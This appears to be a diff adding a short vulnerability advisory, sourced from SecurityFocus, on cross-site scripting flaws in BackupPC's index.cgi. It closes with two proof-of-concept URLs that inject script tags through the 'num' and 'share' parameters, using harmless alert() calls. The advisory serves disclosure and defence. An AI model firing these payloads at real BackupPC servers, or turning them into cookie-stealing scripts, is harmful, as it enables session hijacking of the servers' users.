@@ -1,0 +1,8 @@
+source: http://www.securityfocus.com/bid/47628/info
+
+BackupPC is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks. 
+
+http://www.example.com/index.cgi?action=browse&amp;amp;host=localhost&amp;amp;num=99999%22%3E%3Cscript%3Ealert%28123%29%3C/script%3E
+http://www.example.com/index.cgi?action=RestoreFile&amp;amp;host=localhost&amp;amp;num=1&amp;amp;share=%3Cscript%3Ealert%28234%29%3C/script%3E&amp;amp;dir=
